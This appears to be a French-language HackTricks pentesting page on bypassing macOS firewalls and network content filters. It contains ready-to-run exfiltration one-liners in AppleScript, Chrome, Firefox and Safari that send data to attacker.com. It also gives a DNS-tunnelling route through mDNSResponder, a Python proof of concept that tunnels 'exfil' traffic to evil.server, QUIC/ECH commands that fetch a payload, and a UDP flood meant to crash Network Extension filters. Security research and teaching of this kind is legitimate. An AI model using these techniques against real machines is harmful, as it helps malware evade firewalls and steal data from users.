# Contourner les pare-feu de macOS

{{#include ../../banners/hacktricks-training.md}}

## Techniques découvertes

Les techniques suivantes ont été trouvées fonctionnelles dans certaines applications de pare-feu macOS.

### Abuser des noms de whitelist

- Par exemple, appeler le malware avec des noms de processus macOS bien connus comme **`launchd`**

### Synthetic Click

- Si le pare-feu demande l'autorisation à l'utilisateur, faire **cliquer le malware sur autoriser**

### **Utiliser des binaires signés par Apple**

- Comme **`curl`**, mais aussi d'autres, comme **`whois`**

### Domaines Apple bien connus

Le pare-feu peut autoriser les connexions vers des domaines Apple bien connus, comme **`apple.com`** ou **`icloud.com`**. iCloud pourrait également être utilisé comme C2.

### Contournement générique

Quelques idées à essayer pour contourner les pare-feu

### Vérifier le trafic autorisé

Connaître le trafic autorisé vous aidera à identifier les domaines potentiellement présents dans la whitelist ou les applications autorisées à y accéder
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

Sur macOS, un processus ne communique **pas** directement avec le serveur DNS. La résolution des noms est gérée via **XPC** par **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), un daemon système signé par Apple. Ainsi, chaque requête effectuée sur la machine quitte l'hôte comme un trafic **provenant de `mDNSResponder`**, et non du processus qui en est à l'origine. Les firewalls ont donc tendance à faire confiance inconditionnellement à ce daemon — le bloquer interromprait la résolution des noms pour tout le système.<sup>[1]</sup>

Cela fait du DNS un canal qui reste ouvert même lorsque le firewall bloque les propres sockets du malware :<sup>[1]</sup>

1. Le malware tente de se connecter à `evil.com`. Sa **propre** connexion sortante est examinée par le firewall et **bloquée**.
2. Le malware demande à `mDNSResponder` de **résoudre** `evil.com`, via XPC.
3. Le firewall examine la requête résultante, voit que le résolveur de confiance signé par Apple en est l'émetteur, et **l'autorise**.
4. La requête atteint le serveur DNS — et si l'attaquant exécute le serveur faisant autorité pour `evil.com`, il contrôle les deux extrémités de l'échange.

Puisque l'attaquant possède cette zone, aucune « connexion » n'est jamais nécessaire : les données sont exfiltrées dans les **labels interrogés** (par exemple `<encoded-chunk>.evil.com`) et les commandes reviennent dans les **enregistrements de réponse** (TXT, A, CNAME…), ce qui constitue un tunnelling DNS classique utilisant un processus entièrement autorisé.

Tout processus non privilégié peut piloter directement le daemon, ce qui constitue un moyen simple de confirmer que le chemin est ouvert :
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Via les applications de navigateur

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via des injections de processus

Si vous pouvez **injecter du code dans un processus** autorisé à se connecter à n'importe quel serveur, vous pouvez contourner les protections du pare-feu :


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnérabilités récentes permettant de contourner le pare-feu de macOS (2023-2025)

### Contournement du filtre de contenu Web (Screen Time) – **CVE-2024-44206**
En juillet 2024, Apple a corrigé un bug critique dans Safari/WebKit qui désactivait le « filtre de contenu Web » à l'échelle du système, utilisé par les contrôles parentaux de Screen Time.
Un URI spécialement conçu (par exemple, avec « :// » doublement encodé au format URL) n'est pas reconnu par l'ACL de Screen Time, mais il est accepté par WebKit ; la requête est donc envoyée sans filtrage. Tout processus capable d'ouvrir une URL (y compris du code sandboxed ou unsigned) peut ainsi accéder à des domaines explicitement bloqués par l'utilisateur ou par un profil MDM.<sup>[2]</sup>

Test pratique (système non corrigé) :
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug d’ordre des règles de Packet Filter (PF) dans les premières versions de macOS 14 « Sonoma »
Pendant le cycle bêta de macOS 14, Apple a introduit une régression dans le wrapper userspace autour de **`pfctl`**.
Les règles ajoutées avec le mot-clé `quick` (utilisé par de nombreux kill-switches VPN) étaient silencieusement ignorées, ce qui causait des leaks de trafic même lorsqu’une interface graphique de VPN/firewall indiquait *bloqué*. Le bug a été confirmé par plusieurs fournisseurs de VPN et corrigé dans la RC 2 (build 23A344).

Vérification rapide des leaks :
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abus des services auxiliaires signés par Apple (legacy – avant macOS 11.2)
Avant macOS 11.2, la **`ContentFilterExclusionList`** autorisait environ 50 binaires Apple, tels que **`nsurlsessiond`** et l’App Store, à contourner tous les socket-filter firewalls implémentés avec le framework Network Extension (LuLu, Little Snitch, etc.).
Les malwares pouvaient simplement spawn un processus exclu — ou y injecter du code — puis tunneler leur propre trafic via le socket déjà autorisé. Apple a complètement supprimé la liste d’exclusion dans macOS 11.2, mais la technique reste pertinente sur les systèmes qui ne peuvent pas être mis à niveau.<sup>[3]</sup>

Exemple de proof-of-concept (avant 11.2) :
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH pour contourner les filtres de domaine de Network Extension (macOS 12+)
Les NEFilter Packet/Data Providers se basent sur le SNI/ALPN du TLS ClientHello. Avec **HTTP/3 over QUIC (UDP/443)** et **Encrypted Client Hello (ECH)**, le SNI reste chiffré, NetExt ne peut pas analyser le flux et les règles de nom d’hôte échouent souvent en mode fail-open, permettant au malware d’atteindre des domaines bloqués sans toucher au DNS.<sup>[5]</sup>

PoC minimal :
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Si QUIC/ECH est toujours activé, il s’agit d’un moyen simple de contourner le filtrage des hostname.

### Instabilité de Network Extension sous macOS 15 « Sequoia » (2024–2025)
Les premières versions 15.0/15.1 font crasher les filtres **Network Extension** tiers (LuLu, Little Snitch, Defender, SentinelOne, etc.). Lorsque le filtre redémarre, macOS supprime ses règles de flux et de nombreux produits adoptent un comportement fail-open. Inonder le filtre avec des milliers de flux UDP courts (ou forcer QUIC/ECH) peut déclencher le crash à répétition et laisser une fenêtre pour le C2/l’exfiltration alors que l’interface graphique indique toujours que le firewall est actif.<sup>[4]</sup>

Reproduction rapide (machine de lab sûre) :
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Conseils d'outillage pour les versions modernes de macOS

1. Inspecter les règles PF actuelles générées par les firewalls graphiques :
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Énumérer les binaires qui détiennent déjà l'*entitlement outgoing-network* (utile pour le piggy-backing) :
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Enregistrer par programmation son propre filtre de contenu Network Extension en Objective-C/Swift.
Un PoC rootless minimal qui redirige les paquets vers un socket local est disponible dans le code source de **LuLu** de Patrick Wardle.

## Références

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: créer et contourner les firewalls de macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Le contournement du filtre de contenu web d'Apple permet un accès illimité au contenu bloqué (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple supprime une fonctionnalité de macOS qui permettait aux applications de contourner la sécurité du firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Les produits de cybersécurité cessent de fonctionner après la mise à jour vers macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Utiliser la protection réseau pour empêcher les connexions de macOS à des sites malveillants - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
